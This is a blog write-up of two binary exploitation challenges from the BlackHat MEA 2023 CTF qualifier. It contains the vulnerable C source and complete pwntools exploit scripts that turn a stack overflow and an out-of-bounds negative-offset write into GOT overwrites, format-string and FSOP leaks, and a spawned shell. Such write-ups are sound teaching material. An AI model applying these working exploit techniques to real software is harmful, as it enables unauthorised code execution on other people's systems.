---
layout: post
title: "BlackHat MEA CTF Qualification 2023 Pwnable Write up"
date: 2023-10-12 23:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
img_path: 20231106_blackhat_mea
image: 1.png
---

I solved all pwn problems, but the probs are easier than the probs of other category I think.

Anyway, I was impressed a little by a pwn chall (`memstream`), so I wrote this write up.

- [https://ctftime.org/event/2112](https://ctftime.org/event/2112)

## **Profile**

### **[0x00] Description**

> Give us your profile and we will issue you an ID card

### **[0x01] Summary**

Stack BOF occurs in `person_t` structure, so we can control the argument of `getline` and it leads to AAW primitive.

Using this, I overwrite `free_got` of binary with `printf` (for leak) and `system` (for shell)

### **[0x02] Solutions**

```c
struct person_t {
  int id;
  int age;
  char *name;
};

void get_value(const char *msg, void *pval) {
  printf("%s", msg);
  if (scanf("%ld%*c", (long*)pval) != 1)
    exit(1);
}

void get_string(const char *msg, char **pbuf) {
  size_t n;
  printf("%s", msg);
  getline(pbuf, &n, stdin);
  (*pbuf)[strcspn(*pbuf, "\n")] = '\0';
}

int main() {
  struct person_t employee = { 0 };

  employee.id = rand() % 10000;
  get_value("Age: ", &employee.age);
  if (employee.age < 0) {
    puts("[-] Invalid age");
    exit(1);
  }
  get_string("Name: ", &employee.name);
  printf("----------------\n"
         "ID: %04d\n"
         "Name: %s\n"
         "Age: %d\n"
         "----------------\n",
         employee.id, employee.name, employee.age);

  free(employee.name);
  exit(0);
}
```

The program is simple, get employee's age and name.

But, there is overflow vulnerability in `get_value` because the size of `employee.age` is 4 bytes. It treats the argument(`pval`) as 8 bytes variable.

Using this, we can write over `name` variable and we can control the address of `name`.

```
NAME
       getline, getdelim - delimited string input

DESCRIPTION
       getline()  reads  an entire line from stream, storing the address of the
       buffer containing the text into *lineptr.  The buffer is null-terminated
       and includes the newline character, if one was found.

       If  *lineptr  is  set to NULL and *n is set 0 before the call, then get‐
       line() will allocate a buffer for storing the line.  This buffer  should
       be freed by the user program even if getline() failed.
```

If we set `name` as the address which we want to overwrite, `getline` uses it and we can overwrite it.

```
$ checksec profile
[*] '/home/brwook/ctf/33_blackhat_mea/profile/profile'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Even, the problem has a weak mitigation (Partial RELRO, No PIE). Therefore we can overwrite `free` got as `_start` or `main` function and we can get unlimited AAW primitive.

```py
from pwn import *

if args.REMOTE:
    p = remote('localhost', 5000)
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = process('./profile', aslr=1)
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"

libc = ELF(libc_path, False)
_start = 0x4011b0
free_got = 0x404018
exit_got = 0x404068
printf_plt = 0x401120
p.sendlineafter(b"Age: ", str((free_got) << 32).encode())
p.sendlineafter(b"Name: ", p64(_start)[:3])
p.sendlineafter(b"Age: ", str((exit_got) << 32).encode())
p.sendlineafter(b"Name: ", p64(_start)[:3])
p.sendlineafter(b"Age: ", str((free_got) << 32).encode())
p.sendlineafter(b"Name: ", p64(printf_plt)[:3])
pause()

p.sendlineafter(b"Age: ", str(0).encode())
payload = b''
payload += b'%p:'*12
p.sendlineafter(b"Name: ", payload)
p.recvuntil(b"----------------\n")
p.recvuntil(b"----------------\n")
s = p.recvuntil(b":Age", True).split(b":")
print(s)
stack = int(s[0], 16)
log.success(f"stack @ {hex(stack)}")
libc.address = int(s[10], 16) - libc.libc_start_main_return 
log.success(f"libc base @ {hex(libc.address)}")
canary = int(s[8], 16)
log.success(f"canary @ {hex(canary)}")

p.sendlineafter(b": ", str((free_got) << 32).encode())
p.sendlineafter(b"Name: ", p64(libc.symbols['system'])[:6])

p.sendlineafter(b": ", str(0).encode())
p.sendlineafter(b"Name: ", b'/bin/sh')

p.interactive()
```

## **memstream**

### **[0x00] Description**

> Seek the file. Seek the flag

### **[0x01] Summary**

The binary is packed with [UPX binary packer](https://github.com/upx/upx). The vulnerability of binary is just `OOB Write` from binary `BSS`, but writing is possible for **lower address** than BSS. Because `memstream` has packed with upx, binary is mapped at upper address than libc. So we can overwrite `libc` BSS, this lead to libc leak and got overwrite.

### **[0x02] Solutions**

```c
#define MEM_MAX 0x1000

char g_buf[MEM_MAX];
off_t g_cur;

static void win() {
  system("/bin/sh");
}

void do_seek() {
  off_t cur = getval("Position: ");
  if (cur >= MEM_MAX) {
    puts("[-] Invalid offset");
    return;
  }
  g_cur = cur;
  puts("[+] Done");
}

void do_write() {
  int size = getval("Size: ");
  if (g_cur + size > MEM_MAX) {
    puts("[-] Invalid size");
    return;
  }
  printf("Data: ");
  if (fread(g_buf + g_cur, sizeof(char), size, stdin) != size)
    exit(1);
  puts("[+] Done");
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  puts("1. Seek\n2. Read\n3. Write");
  while (1) {
    switch (getval("> ")) {
      case 1: do_seek(); break;
      case 2: puts("You know what you wrote."); break;
      case 3: do_write(); break;
      default: return 0;
    }
  }
}
```

The type `off_t` is same with `__int64`, so `g_cur` can have negative value. `g_buf` is at binary BSS.

![2.png](2.png)

As written above, binary BSS is mapped at the address which is upper than `libc` and `ld`. Using this we can overwrite the memory at libc BSS.

I used stdout leak FSOP and overwrite the `strlen got` of libc as `win` function of binary, because libc has Partial RELRO.

```py
from pwn import *
choice = lambda idx: p.sendlineafter(b"> ", str(idx).encode())
def seek(pos):
    choice(1)
    p.sendlineafter(b"Position: ", str(pos).encode())
def write(size, data):
    choice(3)
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data.ljust(size, b'\x00'))

while True:
    p = remote('localhost', 5000)
    # p = remote('54.78.163.105', 30374)
    libc_path = "./libc.so.6"
    libc = ELF(libc_path, False)

    write(8, b'A'*8)
    seek(-0x528e0)
    write(0x22, p64(0xfbad1800) + p64(0) * 3 + p16(0xf780))
    try:
        magic = u64(p.recv(8))
    except Exception:
        p.close()
        continue

    assert magic == 0xfbad1800
    break

p.recv(0x18)
libc.address = u64(p.recv(8)) - libc.symbols['_IO_2_1_stdout_']
strlen_got = libc.address + 0x219098
log.success(f"libc base @ {hex(libc.address)}")
log.info(hex(strlen_got))
binary_base = libc.address + 0x269000
g_buf = binary_base + 0x4060
win = binary_base + 0x1229 

seek(strlen_got - g_buf)
write(8, p64(win))

p.interactive()
```

I was surprised at that UPX virtualization can be abused for exploit and wondered other virtualization tool can be used like this.

- [itaybel](https://github.com/itaybel/Weekly-CTF/blob/main/BlackHatMEA/pwn/memstream.md) used `_dl_fini` logic (`call [rax + 0x3d88]`), it looks good too.